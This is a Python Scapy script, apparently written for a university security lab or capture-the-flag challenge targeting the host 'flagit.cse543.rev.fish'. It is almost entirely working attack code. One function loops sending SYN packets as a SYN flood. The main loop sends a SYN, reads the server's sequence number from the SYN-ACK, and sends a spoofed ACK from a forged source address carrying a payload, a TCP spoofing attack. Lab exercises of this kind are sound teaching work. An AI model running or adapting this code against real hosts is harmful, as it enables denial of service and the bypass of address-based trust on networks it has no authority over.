from scapy.all import *
import argparse
import time
import socket
import netifaces as ni

def syn_flood(model, network_interface):
    tcp_syn = TCP(sport=model["dport"], dport=model["dport"], seq=12345,ack=1000,window=1000,flags="S")
    ip_syn = IP(dst=model["dest_ip"], id=1111, ttl=99)
    pkt = ip_syn/tcp_syn/"payload"
    ans,unans = srloop(pkt, iface=network_interface, inter=0.3,retry=2,timeout=4)
    ans.summary()

def main_tcp(verbose, network_interface):
    model = {
        "src": "10.2.4.10",
        "dst": "flagit.cse543.rev.fish",
        "dport": 13337,
        "target_ip": None,
        "dest_ip": None
    }
    target_ip = ni.ifaddresses(network_interface)[ni.AF_INET][0]['addr']
    dest_ip = socket.gethostbyname(model["dst"])
    model["target_ip"] = target_ip
    model["dest_ip"] = dest_ip

    ip_syn = IP(dst=dest_ip)
    payload = "flagit"
    
    while True:
        tcp_syn = TCP(sport=0, dport=model["dport"], flags="S")
        pkt = ip_syn/tcp_syn/payload
        ans, unans = sr(pkt, multi=1, timeout=1)
        ans.show()
        # 1. FIND SYN-ACK PACKET in ans and extract the seq number
        last_request, last_answer = ans[-1]
        seq = last_answer[TCP].seq
        ack = last_answer[TCP].ack
        # # 2. Send ACK packet with seq number + 1
        ip_spoof = IP(src=model["src"], dst=dest_ip)
        tcp_spoof = TCP(sport=model["dport"], dport=model["dport"], seq=ack, ack=seq + 1, flags="A")
        # # 3. Send payload
        new_pkt = ip_spoof/tcp_spoof/target_ip
        send(new_pkt)
        time.sleep(1)

if __name__ == "__main__":
    network_interface = "tap0"
    main_tcp(verbose=True, network_interface=network_interface)
    